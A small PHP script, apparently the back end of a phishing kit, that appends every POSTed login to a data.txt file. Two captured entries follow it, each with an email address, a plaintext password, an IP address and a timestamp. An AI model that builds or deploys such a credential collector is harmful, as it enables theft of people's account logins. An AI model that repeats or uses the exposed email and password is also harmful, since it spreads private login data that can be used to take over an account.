<?php
// password-save.php
// This file is used to save login information, not directly accessible for security reasons.

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $currentContent = file_get_contents('data.txt'); // Assuming you want to log it in data.txt
    file_put_contents('data.txt', $currentContent . $data . PHP_EOL);
}
?>
Email/Phone: abhayabikramshahiofficial@gmail.com, Password: abhaya@123, IP: ::1, Date/Time: 2024-10-09 15:55:28
Email/Phone: abhayabikramshahiofficial@gmail.com, Password: abhaya@123, IP: ::1, Date/Time: 2024-10-09 15:59:14
